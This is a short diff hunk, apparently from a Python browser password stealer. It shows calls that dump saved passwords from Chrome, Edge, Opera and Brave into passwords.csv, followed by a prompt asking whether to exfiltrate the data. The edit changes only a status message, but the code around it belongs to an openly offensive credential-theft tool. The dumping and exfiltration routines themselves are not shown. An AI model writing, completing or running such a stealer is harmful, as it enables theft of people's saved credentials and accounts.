@@ -85,7 +85,7 @@ dump_passwords(CHROME_PATH_LOCAL_STATE,CHROME_PATH,"chrome.exe","Chrome")
 dump_passwords(EDGE_PATH_LOCAL_STATE,EDGE_PATH,"msedge.exe", "Edge")
 dump_passwords(OPERA_PATH_LOCAL_STATE,OPERA_PATH,"opera.exe","Opera")
 dump_passwords(BRAVE_PATH_LOCAL_STATE,BRAVE_PATH,"brave.exe","Brave")
-print('\n')
+print("[+] Written data to passwords.csv\n")
 data.close()
 
 exfil = input("[?] Do you want to exfiltrate data: Y/N? ")
